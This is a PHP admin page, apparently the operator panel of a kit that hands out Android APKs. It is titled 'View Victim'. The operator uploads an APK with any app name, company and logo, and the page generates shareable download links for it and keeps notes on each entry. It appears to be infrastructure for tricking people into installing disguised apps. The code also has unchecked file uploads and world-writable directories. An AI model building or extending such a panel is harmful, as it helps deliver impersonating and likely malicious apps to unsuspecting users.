<?php
session_start();
require_once 'inc/config.php';

if (!isset($_SESSION['logged'])) {
    header('Location: login.php');
    exit;
}

$linksFile = 'links.json';

// Load existing links
$links = [];
if (file_exists($linksFile)) {
    $links = json_decode(file_get_contents($linksFile), true) ?? [];
}








if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check if form was submitted with add_link button
    if (isset($_POST['add_link'])) {
        // Debug to check file uploads
        error_log("FILES data: " . print_r($_FILES, true));
        error_log("POST data: " . print_r($_POST, true));

        // Verify file uploads are present
        if (!isset($_FILES['apk_file']) || !isset($_FILES['logo_file'])) {
            die("File uploads missing. APK: " . isset($_FILES['apk_file']) . " Logo: " . isset($_FILES['logo_file']));
        }

        // Check file upload errors
        if ($_FILES['apk_file']['error'] !== UPLOAD_ERR_OK || $_FILES['logo_file']['error'] !== UPLOAD_ERR_OK) {
            die("File upload errors. APK error: " . $_FILES['apk_file']['error'] . " Logo error: " . $_FILES['logo_file']['error']);
        }

        $custom_id = substr(md5(uniqid(rand(), true)), 0, 5);
        $app_name = $_POST['app_name'];
        $app_company = $_POST['app_company'];

        // Handle APK upload
        $apk_file = $_FILES['apk_file'];
        $apk_name = $custom_id . '_' . basename($apk_file['name']);
        $apk_path = '../downloads/' . $apk_name;
        
        // Handle logo upload
        $logo_file = $_FILES['logo_file'];
        $logo_name = $custom_id . '_' . basename($logo_file['name']);
        $logo_path = '../assets/' . $logo_name;

        // Create directories if they don't exist
        if (!file_exists('../downloads/')) {
            mkdir('../downloads/', 0777, true);
        }
        if (!file_exists('../assets/')) {
            mkdir('../assets/', 0777, true);
        }

        // Attempt file moves with error checking
        if (!move_uploaded_file($apk_file['tmp_name'], $apk_path)) {
            die("Failed to move APK file: " . error_get_last()['message']);
        }
        if (!move_uploaded_file($logo_file['tmp_name'], $logo_path)) {
            die("Failed to move logo file: " . error_get_last()['message']); 
        }

        $links[] = [
            'custom_id' => $custom_id,
            'app_name' => $app_name,
            'app_company' => $app_company,
            'apk_file' => $apk_name,
            'logo_file' => $logo_name,
            'notes' => ''
        ];

        // Ensure proper JSON encoding
        $json = json_encode($links, JSON_PRETTY_PRINT);
        if ($json === false) {
            error_log("JSON encoding failed: " . json_last_error_msg());
        } else {
            file_put_contents($linksFile, $json);
        }

        // Redirect after successful upload
        header('Location: generate_link.php');
        exit;
    } elseif (isset($_POST['delete_link'])) {
        $id = $_POST['link_id'];
        
        // Find and delete associated files
        foreach ($links as $link) {
            if ($link['custom_id'] === $id) {
                @unlink('../downloads/' . $link['apk_file']);
                @unlink('../assets/' . $link['logo_file']);
                break;
            }
        }
        
        $links = array_filter($links, function($link) use ($id) {
            return $link['custom_id'] !== $id;
        });

        // Ensure proper JSON encoding
        $json = json_encode(array_values($links), JSON_PRETTY_PRINT);
        if ($json === false) {
            error_log("JSON encoding failed: " . json_last_error_msg());
        } else {
            file_put_contents($linksFile, $json);
        }
    } elseif (isset($_POST['update_notes'])) {
        $id = $_POST['link_id'];
        $notes = $_POST['notes'];
        
        foreach ($links as &$link) {
            if ($link['custom_id'] === $id) {
                $link['notes'] = $notes;
                break;
            }
        }

        // Ensure proper JSON encoding
        $json = json_encode($links, JSON_PRETTY_PRINT);
        if ($json === false) {
            error_log("JSON encoding failed: " . json_last_error_msg());
        } else {
            file_put_contents($linksFile, $json);
        }
        header('Location: generate_link.php');
        exit;
    }
}

?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link 
    rel="stylesheet" 
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
    >
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <style>
        .btn-info {
          background-color: #2E2E2E!important;
            border-color: #2E2E2E !important;
        }

        .textarea-custom {
            color: white;
            width: 100%;
            background-color: #323232;
            border: unset;
            padding: 15px;
            margin-bottom: 15px;
            font-family: monospace;
        }

        .bg-dark {
            background-color: #232323!important;
        }
    </style>
    <title>View Victim</title>
	<script src="../js/jquery-3.4.1.min.js"></script>
	
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
    <script>
    const Toast = Swal.mixin({
    toast: true,
    position: 'top-end',
    showConfirmButton: false,
    timer: 8000,
    timerProgressBar: true,
    onOpen: (toast) => {
        toast.addEventListener('mouseenter', Swal.stopTimer)
        toast.addEventListener('mouseleave', Swal.resumeTimer)
    }
    })


    </script>
    <style>

        .blink_me {
            animation: blinker 1s linear infinite;
        }

        @keyframes blinker {
            50% {
                opacity: 0;
            }
        }

      

        .btn-custom-data{
            width:100%;
            display:block;
            margin-bottom: 5px;
            position: relative;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    z-index: 1;

    overflow: hidden;

    
          font-weight:bold;
    font-size: .8rem;
    padding: 0.85rem 2.13rem;
    margin: 6px;
    border-radius: 2px;
    border: 0;
    -webkit-transition: .2s ease-out;
    transition: .2s ease-out;
    white-space: normal!important;
    cursor: pointer;
        }
    </style>
  </head>
  <body style="background-color: #121212;font-family:Arial;">
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <div class="container">
      <a class="navbar-brand" href="#">page</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse " id="navbarNav">
	  <ul class="navbar-nav ml-auto">
        
          <li class="nav-item">
            <a class="nav-link" href="index.php?page=logout"><i class="fa-solid fa-right-from-bracket"></i> Log Out</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="generate_link.php"><i class="fa-solid fa-link"></i> Generate Link</a>
        </li>
         
         
        </ul>
      </div>
      </div>
    </nav>
    <div class="container" style="padding-top: 50px;">
      
      <div class="row">
        <div class="col-md-2"></div>
        <div class="col-md-8">
        <div class="card" style="background-color: unset;border:unset;">
  <div class="card-body" style="color: white;background-color: #232323;border-radius: 15px;border: unset;">
  <h1>Generate Link</h1>
        <form method="POST" action="generate_link.php" enctype="multipart/form-data">
            <div class="form-group">
                <label for="app_name">App Name</label>
                <input type="text" class="form-control" name="app_name" required>
            </div>
            <div class="form-group">
                <label for="app_company">App Company</label>
                <input type="text" class="form-control" name="app_company" required>
            </div>
           
           <div class="form-group">
                <label for="logo_file">App Logo</label>
                <input type="file" class="form-control" name="logo_file" accept="image/*" required>
            </div>
            <div class="form-group">
                <label for="apk_file">APK File</label>
                <input type="file" class="form-control" name="apk_file" accept=".apk" required>
            </div> 
            <button type="submit" name="add_link" value="1" class="btn btn-primary">Add Link</button>
        </form>
        <table class="table table-striped table-bordered table-dark" style="margin-top: 20px;">
            <thead>
                <tr>
                    <th scope="col">Custom ID</th>
                    <th scope="col">App Name</th>
                    <th scope="col">App Company</th>
                    <th scope="col">Logo</th>
                    <th scope="col">APK</th>
                    <th scope="col">Notes</th>
                    <th scope="col">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($links as $link): ?>
                <tr>
                    <td>
                        <?php 
                        $url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . str_replace('es/admin/generate_link.php', 'index.php', $_SERVER['REQUEST_URI']) . '?view=' . $link['custom_id'];
                        ?>
                        <div class="input-group">
                            <input type="text" class="form-control" value="<?php echo htmlentities($url); ?>" id="link_<?php echo $link['custom_id']; ?>" readonly>
                            <div class="input-group-append">
                                <button class="btn btn-info" type="button" onclick="copyToClipboard('link_<?php echo $link['custom_id']; ?>')">
                                    <i class="fa-solid fa-copy"></i>
                                </button>
                            </div>
                        </div>
                    </td>
                    <td><?php echo htmlentities($link['app_name']); ?></td>
                    <td><?php echo htmlentities($link['app_company']); ?></td>
                    <td><img src="../assets/<?php echo htmlentities($link['logo_file']); ?>" width="50" height="50"></td>
                    <td><a href="../downloads/<?php echo htmlentities($link['apk_file']); ?>" target="_blank">Download APK</a></td>
                    <td>
    <form method="POST">
        <input type="hidden" name="link_id" value="<?php echo $link['custom_id']; ?>">
        <textarea class="form-control" name="notes" rows="3"><?php echo htmlentities($link['notes']); ?></textarea>
        <button type="submit" name="update_notes" class="btn btn-primary btn-sm">Save Notes</button>
    </form>
</td>
                    <td>
                        <form method="POST" style="display:inline;">
                            <input type="hidden" name="link_id" value="<?php echo $link['custom_id']; ?>">
                            <button type="submit" name="delete_link" class="btn btn-danger btn-sm">Delete</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; ?>
                <script>
                function copyToClipboard(elementId) {
                    var copyText = document.getElementById(elementId);
                    copyText.select();
                    copyText.setSelectionRange(0, 99999);
                    document.execCommand("copy");
                    Toast.fire({
                        icon: 'success',
                        title: 'Link copied to clipboard'
                    });
                }

             
                </script>
            </tbody>
        </table>
	
  </div>
 
</div>	
        </div>
        <div class="col-md-2">
	
		</div>
      </div>
     
    </div>







    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>
